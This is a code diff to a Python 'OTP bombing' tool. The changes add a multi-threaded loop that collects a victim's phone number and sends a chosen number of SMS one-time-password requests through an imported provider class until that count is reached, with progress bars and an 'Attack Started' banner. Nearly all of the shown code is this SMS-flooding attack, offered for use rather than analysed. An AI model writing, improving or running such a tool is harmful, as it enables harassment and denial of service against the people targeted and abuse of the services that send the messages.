@@ -24,11 +24,15 @@ Warning to Code Thieves:
 """
 from rich.console import Console
 from rich.panel import Panel
+from AttackModes.provider import APIProvider
 from rich.prompt import Prompt
 import re
-import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
+
 
 console = Console()
+
 
 def sms_banner():
     console.print(Panel.fit(
@@ -88,7 +92,7 @@ def get_mobile_number():
         else:
             console.print("[bold red]❌ Must be exactly 10 digits, no symbols.[/bold red]")
 
-def sendotp():
+def getio():
     sms_banner()
     input_instructions()
     
@@ -101,41 +105,50 @@ def sendotp():
     otpcount = get_otp_count()
     if otpcount == "exit": 
         return None
-
+    
     return country_code, mobile_no, otpcount
+    
 
-
-def attack(country_code,mobile_no,otpcount):
+def sendotp(country_code, mobile_no, otpcount):
     console.print(Panel.fit(
-    f"[bold green]✅ You entered:[/bold green]\n\n"
-    f"[bold cyan]Country Code:[/bold cyan] {country_code}\n"
-    f"[bold cyan]Mobile Number:[/bold cyan] {mobile_no}\n"
-    f"[bold cyan]OTP Count:[/bold cyan] {otpcount}\n\n"
-    f"[red]❌ Press 'x' anytime to exit[/red]",
-    border_style="green"
-))
+        "[bold yellow]🚀 Attack Started[/bold yellow]\n\n"
+        f"👉 Country code: {country_code}\n"
+        f"👉 Mobile number: {mobile_no}\n"
+        f"👉 OTP count: {otpcount}\n",
+        border_style="magenta"
+    ))
 
-    # URL to which the POST request is sent
-    url = "https://example.com/api/send_otp"
+    country_code = country_code.replace("+", "")
+    api = APIProvider(country_code, mobile_no, "sms", delay=1)
 
-    # JSON payload
-    payload = {
-        "country_code": country_code,
-        "mobile_no": mobile_no,
-        "otp_count": otpcount
-    }
+    success, failed = 0, 0
 
-    # Headers (optional but commonly needed)
-    headers = {
-        "Content-Type": "application/json"
-    }
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(bar_width=None),
+        "[progress.percentage]{task.percentage:>3.0f}%",
+        TimeElapsedColumn(),
+        console=console,
+        transient=True
+    ) as progress:
+        task = progress.add_task("[cyan]Sending OTPs...", total=otpcount)
 
-    # Sending the POST request
-    try:
-        response = requests.post(url, headers=headers, json=payload)
-        response.raise_for_status()  # Raise an error for bad status codes
-        print("✅ Response:", response.json())
-    except requests.exceptions.RequestException as e:
-        print(f"❌ Error sending request: {e}")
-    print("📲 OTP Bombing Started...")
+        while success < otpcount:
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                jobs = [executor.submit(api.hit) for _ in range(otpcount - success)]
 
+                for job in as_completed(jobs):
+                    result = job.result()
+                    if result is None:
+                        print("❌ Try again later")
+                        input("🔙 Enter 0 to return main menu...")
+                        return
+                    if result:
+                        success += 1
+                        progress.advance(task)
+                    else:
+                        failed += 1
+
+    input("\n✅ OTP Bombing Completed!\n\n🔙 Enter 0 to return to the main menu: ")        
+    return country_code, mobile_no, otpcount
